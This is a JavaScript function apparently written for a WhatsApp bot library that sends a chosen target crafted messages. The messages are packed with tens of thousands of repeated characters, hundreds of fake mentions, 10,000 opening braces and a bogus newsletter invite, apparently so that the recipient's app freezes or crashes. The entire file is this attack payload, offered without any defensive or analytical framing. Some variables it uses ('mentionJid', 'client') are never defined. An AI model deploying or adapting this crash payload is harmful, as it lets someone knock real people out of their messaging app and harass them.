async function blankLagi(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://link/poto.jpg" } },
    { upload: sock.waUploadToServer }
  )

  try {
    const Msg = {
      extendedTextMessage: {
        text: "Makan Blank Bang" + "ꦾ".repeat(6000),
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 700 },
              () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
          stanzaId: sock.generateMessageTag(),
          participant: mentionJid,
          quotedMessage: {
            conversation: "ꦾ".repeat(60000)
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(10000)
        }
      }
    };

    await sock.relayMessage(target, Msg, {
      messageId: client.generateMessageTag()
    });

    const newsletterMsg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "Snith Point",
            jpegThumbnail: media,
            caption: "ꦾ".repeat(3000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      },
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: sock.generateMessageTag(),
        quotedMessage: {
          conversation: "ꦾ".repeat(60000)
        }
      }
    };

    await sock.relayMessage(target, newsletterMsg, {
      messageId: client.generateMessageTag()
    });

  } catch (err) {
    console.error("Error:", err);
  }
}